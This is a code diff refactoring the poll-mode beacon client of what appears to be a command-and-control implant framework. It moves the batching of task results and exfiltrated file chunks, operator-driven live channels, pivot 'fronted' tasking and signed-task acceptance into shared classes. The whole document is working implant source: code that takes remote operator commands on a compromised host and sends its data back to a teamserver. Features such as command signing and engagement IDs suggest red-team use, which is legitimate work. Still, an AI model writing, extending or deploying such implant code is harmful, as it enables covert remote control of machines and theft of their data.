@@ -47,13 +47,12 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     public const string Route = "/implants/beacon";
 
     /// <summary>
-    /// The handshake capability a degraded-channels bake advertises
-    /// (architecture.md Sec 10.3): "this artifact accepts channel traffic
-    /// over its poll check-ins." The teamserver's degraded hub parks
-    /// operator input against the advertising session and delivers it on
-    /// its cycles.
+    /// The handshake capability a poll run advertises, carried by the shared
+    /// poll-channel carriage (<see cref="PollChannels.Capability"/>): the
+    /// teamserver's degraded hub parks operator input against the
+    /// advertising session and delivers it on its cycles.
     /// </summary>
-    internal const string DegradedCapability = "channels.poll";
+    internal const string DegradedCapability = PollChannels.Capability;
 
     private readonly EgressEndpoints _egress;
     private readonly string _implantId;
@@ -89,14 +88,16 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // shapes.
     private readonly HeldTaskLedger _held;
 
-    // Upstream frames waiting for the next POST: task results, exfil chunks,
-    // and staged demands produced by earlier responses. Cleared only after a
-    // response is processed -- a failed POST re-sends the batch whole, and
-    // the server treats a retransmitted result for an already-completed task
-    // as a no-op, so a partial failure never loses or double-records a result.
-    private readonly List<Frame> _upstream = new();
+    // The store-and-forward carriage every poll run holds (PollChannels):
+    // the upstream batch (task results, exfil chunks, staged demands, channel
+    // output) waiting for the next POST, and the live channels batching their
+    // output into it. Cleared only after a response is processed -- a failed
+    // POST re-sends the batch whole, and the server treats a retransmitted
+    // result for an already-completed task as a no-op, so a partial failure
+    // never loses or double-records a result.
+    private readonly PollChannels _poll;
 
-    // The staged tasks whose StagedPull frames ride _upstream, in demand
+    // The staged tasks whose StagedPull frames ride the batch, in demand
     // order: the response answers each demand with its chunk run before any
     // new tasking, so this list is the key to reading the response back.
     private readonly List<string> _demands = new();
@@ -105,6 +106,12 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // accepted in one response is demanded on the next request and dispatches
     // when its terminal chunk arrives.
     private readonly Dictionary<string, TaskRequest> _stagedAwaiting = new();
+
+    // The shared task-acceptance pipeline (fronting gate, verification,
+    // dedup, staged/channel/inline shapes) over this client's batch
+    // discipline -- the same pipeline every other client runs, with the
+    // delivery mark deferred to the batch's crossing.
+    private readonly BeaconTasking _tasking;
 
     // The per-artifact check-in seal (architecture.md Sec 8/9): the baked key
     // split into its id and key halves, present only when the bake asked for
@@ -124,25 +131,6 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // has always been.
     private readonly string _mode;
 
-    // The degraded-channel opt-in (architecture.md Sec 10.3): when the bake
-    // carried it, the interactive verbs claim over this cycle's own bodies.
-    private readonly bool _degradedChannels;
-
-    // The live channels a degraded bake holds across cycles, keyed by task
-    // id: the handler runs in the background for as long as the channel
-    // lasts, its output batching into the upstream like any other frame and
-    // its input arriving as ChannelInput frames on later responses.
-    private readonly ConcurrentDictionary<string, BeaconLiveChannel> _liveChannels = new();
-
-    // Ends every live channel when the run ends: the token releases the
-    // handlers (their processes are killed and their pumps unwind), the
-    // delivery waits keep the last upstream writes accounted.
-    private readonly CancellationTokenSource _channelsGone = new();
-
-    // Serializes the upstream batch between the cycle thread (snapshot,
-    // delivered-frame removal) and every background channel's output writes.
-    private readonly object _upstreamGate = new();
-
     public EnvelopeBeacon(
         EgressEndpoints egress,
         string implantId,
@@ -158,7 +146,6 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         TransportProfile? transport = null,
         Cadence? cadence = null,
         string mode = BeaconModes.Poll,
-        bool degradedChannels = false,
         HeldTaskLedger? held = null)
     {
         _egress = egress;
@@ -180,11 +167,19 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         _log = log;
         _nonces = nonces ?? new TaskNonceTracker();
         _held = held ?? new HeldTaskLedger();
+        _poll = new PollChannels(_held, log);
         _seal = transport is { SealsCheckIns: true }
             ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
             : null;
         _mode = mode;
-        _degradedChannels = degradedChannels;
+        // The shared acceptance over this client's batch discipline: results
+        // queue for the next POST, so the delivery mark waits for the batch
+        // to cross (markResultsOnWrite off) -- a failed cycle followed by a
+        // walk switch still replays the result on the next client.
+        _tasking = new BeaconTasking(
+            _implantId, _cas, _fronted, _nonces, _held,
+            HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers), _log,
+            markResultsOnWrite: false);
     }
 
     /// <summary>
@@ -231,13 +226,9 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         finally
         {
             // The run is ending: the channels are run-scoped, so they end
-            // with it -- the token releases the handlers, and the delivery
-            // waits keep the last upstream writes accounted before the
-            // coordinator moves on.
-            _channelsGone.Cancel();
-            foreach (var live in _liveChannels.Values)
-                live.CompleteInput();
-            await Task.WhenAll(_liveChannels.Values.Select(c => c.Delivery));
+            // with it -- the shared carriage releases the handlers and waits
+            // out the delivery tasks before the coordinator moves on.
+            await _poll.DisposeAsync();
         }
     }
 
@@ -320,11 +311,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         // a background channel's output added mid-cycle is not lost -- and a
         // failed POST re-sends the batch whole.
         var demandOrder = _demands.ToList();
-        List<Frame> pending;
-        lock (_upstreamGate)
-        {
-            pending = new List<Frame>(_upstream);
-        }
+        var pending = _poll.SnapshotPending();
         // The cached results riding this batch (architecture.md Sec 10.3 --
         // the dispatch strand): everything the ledger holds undelivered was
         // queued upstream before the snapshot, so a response processed below
@@ -388,11 +375,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         var acks = handshake.TaskAcks;
         _log.WriteLine($"handshake ok: engagement={handshake.EngagementId}, replay-nonces={handshake.ReplayNonces}");
 
-        lock (_upstreamGate)
-        {
-            foreach (var delivered in pending)
-                _upstream.Remove(delivered);
-        }
+        _poll.MarkDelivered(pending);
         foreach (var remembered in sending)
             _held.MarkDelivered(remembered.TaskId);
         _demands.Clear();
@@ -467,7 +450,7 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             var frame = inbound[index];
             if (frame.Kind == FrameKind.ChannelInput)
             {
-                BeaconFrames.RouteChannelInput(frame, _liveChannels, _log);
+                _poll.RouteInput(frame);
                 continue;
             }
 
@@ -485,137 +468,54 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             // The dispatch strand's ack half (architecture.md Sec 10.3):
             // delivery evidence for the parsed frame, queued into the next
             // request body before anything runs. The dedup half lives inside
-            // AcceptTasking, after verification.
+            // the shared acceptance, after verification.
             if (acks)
                 AddUpstream(BeaconFrames.AckFrame(task.TaskId));
-            AcceptTasking(task);
-        }
-    }
 
-    // One dispatched TaskRequest: verify the signature (and nonce) exactly as
-    // the stream does, then dispatch inline, demand the staged payload, or
-    // refuse the channel shape. The result (and any exfil chunks) queue for
-    // the next POST -- the poll cycle reports on the check-in after the one
-    // that carried the tasking.
-    private void AcceptTasking(TaskRequest task)
-    {
-        // Fronted tasking (architecture.md Sec 5.2): a frame marked with
-        // another implant's id is a Pivot child's tasking this check-in
-        // executes on the child's behalf. The gate is the fronted ledger:
-        // only a child this implant enrolled is frontable.
-        var targetId = _implantId;
-        var fronted = false;
-        if (task.HasTargetImplantId && task.TargetImplantId.Length > 0 && task.TargetImplantId != _implantId)
-        {
-            targetId = task.TargetImplantId;
-            fronted = true;
-            if (_fronted is null || !_fronted.Knows(targetId))
+            // The staged arm defers across cycles -- the demand rides the
+            // next request, the chunk run its response -- the envelope
+            // cycle's own shape, ahead of the shared inline acceptance.
+            if (task.HasStagedBytes)
             {
-                _log.WriteLine($"task {task.TaskId} refused: fronting for unknown implant {targetId}");
-                QueueResult(task, TaskOutcome.Failed,
-                    $"task refused: fronted tasking for implant {targetId}, which this implant did not enroll; not executed");
-                return;
-            }
-        }
-
-        // Command signing (architecture.md Sec 9): verify before anything
-        // runs, nonce floor included. The signed tuple's implant id is the
-        // target's own, and the nonce arm follows the target too -- a pivot
-        // child never handshakes, so its tasking keeps the nonce-less shape.
-        var verdict = TaskingVerifier.Verify(targetId, task, _cas, fronted ? new TaskNonceTracker() : _nonces);
-        if (verdict != TaskingVerdict.Accepted)
-        {
-            var cause = verdict switch
-            {
-                TaskingVerdict.RejectedReplay =>
-                    $"task rejected: replayed tasking (nonce {task.TaskNonce} at or below the accepted floor); not executed",
-                TaskingVerdict.RejectedNoNonce =>
-                    "task rejected: no task nonce after the replay-nonce handshake; not executed",
-                _ => "task rejected: signature verification failed; not executed",
-            };
-            _log.WriteLine($"task {task.TaskId} rejected: {verdict}");
-            _held.Hold(task.TaskId);
-            QueueResult(task, TaskOutcome.Failed, cause);
-            return;
-        }
-
-        // The dispatch strand's dedup half (architecture.md Sec 10.3),
-        // deliberately AFTER verification: the replay defense stays ahead of
-        // the ledger, so a verbatim replay of a held task still falls at the
-        // nonce floor (or the signature) and is refused on the task. A
-        // redelivery that cleared verification re-queues the cached result
-        // unconditionally -- a redelivery implies the server holds no
-        // recorded result, and a duplicate against a completed task is a
-        // no-op there (first-wins). Nothing re-executes.
-        if (_held.Contains(task.TaskId))
-        {
-            if (_held.TryGetResult(task.TaskId, out var heldOutcome, out var heldOutput))
-            {
-                QueueResult(task.TaskId, heldOutcome, heldOutput);
-                _log.WriteLine($"task {task.TaskId} redelivered; answered from the ledger without re-running");
-            }
-            else
-            {
-                // Held but unfinished (a degraded channel still open, a task
-                // still running): nothing to re-send and nothing to re-run.
-                _log.WriteLine($"task {task.TaskId} redelivered while still held; re-acked without re-running");
-            }
-            return;
-        }
-
-        // The streaming shape over the poll cycle: under the degraded
-        // opt-in the channel handler runs in the background, its output
-        // batching into the upstream like any other frame and its input
-        // arriving as ChannelInput frames on later responses; without the
-        // opt-in the server never claims the verb, so reaching here without
-        // it is a protocol break -- refuse it on the task.
-        if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
-        {
-            if (!_degradedChannels)
-            {
-                _log.WriteLine($"task {task.TaskId} refused: no channel on an envelope check-in");
                 _held.Hold(task.TaskId);
-                QueueResult(task, TaskOutcome.Failed,
-                    $"{task.Verb} requires a stream-mode check-in or the degraded-channels bake; this cycle carries neither");
-                return;
+                _stagedAwaiting[task.TaskId] = task;
+                _demands.Add(task.TaskId);
+                AddUpstream(new Frame
+                {
+                    Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
+                    Kind = FrameKind.StagedPull,
+                });
+                continue;
             }
-            _held.Hold(task.TaskId);
-            StartPollChannel(task, channelHandler);
-            return;
-        }
 
-        // The typed arm (architecture.md Sec 10): a staged task's bulk
-        // payload is demanded on the next POST and dispatches when its chunk
-        // run arrives.
-        if (task.HasStagedBytes)
-        {
-            _held.Hold(task.TaskId);
-            _stagedAwaiting[task.TaskId] = task;
-            _demands.Add(task.TaskId);
-            AddUpstream(new Frame
-            {
-                Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
-                Kind = FrameKind.StagedPull,
-            });
-            return;
-        }
-
-        _held.Hold(task.TaskId);
-        var (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
-        QueueResult(task, outcome, output);
-        // Out-of-band exfil chunks follow the TaskResult on the next POST,
-        // each carrying the task id so the server reassembles into the
-        // artifact store (architecture.md Sec 10.1 exfil, Sec 11).
-        foreach (var chunk in chunks)
-        {
-            chunk.TaskId = task.TaskId;
-            AddUpstream(new Frame
-            {
-                Payload = ByteString.CopyFrom(chunk.ToByteArray()),
-                Kind = FrameKind.ExfilChunk,
-            });
+            // The shared acceptance: fronted gate, verification, dedup, then
+            // the channel arm onto the store-and-forward carriage or the
+            // inline dispatch -- results queue into the batch (the write
+            // delegate below), the delivery mark waiting for the batch to
+            // cross.
+            _ = _tasking.AcceptAsync(
+                task,
+                QueueUpstream,
+                RefuseStagedOnTheWire,
+                (started, handler) => _poll.StartChannel(started, handler),
+                CancellationToken.None);
         }
     }
+
+    // One frame into the next request's batch: the queueing write the shared
+    // acceptance reports through.
+    private Task QueueUpstream(Frame frame, CancellationToken cancellationToken)
+    {
+        AddUpstream(frame);
+        return Task.CompletedTask;
+    }
+
+    // The staged arm is handled ahead of the acceptance; reaching this
+    // delegate is an ordering break, not a transfer.
+    private Task<(TaskOutcome Outcome, string Output)> RefuseStagedOnTheWire(
+        TaskRequest staged, CancellationToken cancellationToken)
+        => throw new InvalidOperationException("the staged arm is handled ahead of the acceptance");
+
 
     private Frame HandshakeFrame()
     {
@@ -624,86 +524,24 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         // intersected with the compiled handlers (architecture.md Sec 5.3),
         // both negotiation arms offered.
         var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
-        // The degraded opt-in rides the advertisement: the server's parking
-        // hub reads it off the session and claims the channel verbs against
-        // this cycle only when it is there.
-        if (_degradedChannels)
-            handshake.Capabilities.Add(DegradedCapability);
+        // The store-and-forward channel carriage rides the advertisement:
+        // the server's parking hub reads it off the session and claims the
+        // channel verbs against this cycle. Every poll artifact carries it
+        // -- the latency is the operator's tradeoff to make, not the bake's.
+        handshake.Capabilities.Add(DegradedCapability);
         return new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) };
     }
 
-    // Opens one channel for a dispatched streaming task and starts its
-    // handler in the background: the cycle thread returns to its cadence
-    // immediately, the channel's output batches into the upstream through
-    // the shared live-channel write binding, and the delivery task reports
-    // the handler's outcome as the task's final TaskResult on whatever
-    // check-in carries it.
-    private void StartPollChannel(TaskRequest task, CapabilityChannelHandler handler)
-    {
-        var channel = new BeaconLiveChannel(
-            task.TaskId,
-            (frame, ct) =>
-            {
-                AddUpstream(frame);
-                return ValueTask.CompletedTask;
-            });
-        _liveChannels[task.TaskId] = channel;
-        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb} (degraded, poll cadence)");
-        channel.Delivery = DeliverPollChannelAsync(channel, task, handler);
-    }
+    // Thin delegates over the shared poll carriage (PollChannels): this
+    // client's dispatch paths keep their local spelling, the batch and the
+    // live channels live in the one implementation every poll client shares.
+    private void AddUpstream(Frame frame) => _poll.AddUpstream(frame);
 
-    // The channel's delivery: run the handler to its end, then queue its
-    // outcome. A channel whose run ends under it reports nothing further --
-    // the server-side timeout is the documented close for a channel the
-    // cycles stopped carrying.
-    private async Task DeliverPollChannelAsync(
-        BeaconLiveChannel channel,
-        TaskRequest task,
-        CapabilityChannelHandler handler)
-    {
-        try
-        {
-            var (outcome, output) = await handler.Handle(task.Arguments, channel, _channelsGone.Token);
-            QueueResult(task, outcome, output);
-            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
-        }
-        catch (OperationCanceledException)
-        {
-            // The run ended: the channel dies with it, documented.
-        }
-        catch (Exception ex)
-        {
-            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
-        }
-        finally
-        {
-            _liveChannels.TryRemove(task.TaskId, out _);
-            channel.CompleteInput();
-        }
-    }
-
-    // One frame into the upstream batch, under the gate the background
-    // channels' output writes share with the cycle thread's snapshot.
-    private void AddUpstream(Frame frame)
-    {
-        lock (_upstreamGate)
-        {
-            _upstream.Add(frame);
-        }
-    }
-
-    // Queues one task result and caches it in the held-task ledger: the
-    // delivery mark lands only when the cycle carrying the batch completed,
-    // so a dropped POST re-sends through the batch the ledger's re-send
-    // would have covered anyway.
     private void QueueResult(TaskRequest task, TaskOutcome outcome, string output)
-        => QueueResult(task.TaskId, outcome, output);
+        => _poll.QueueResult(task.TaskId, outcome, output);
 
     private void QueueResult(string taskId, TaskOutcome outcome, string output)
-    {
-        AddUpstream(BeaconFrames.ResultFrame(taskId, outcome, output));
-        _held.Remember(taskId, outcome, output);
-    }
+        => _poll.QueueResult(taskId, outcome, output);
 
     // The sealed check-in counter's size in bytes: an 8-byte big-endian
     // integer, the same width the teamserver's floor reads.
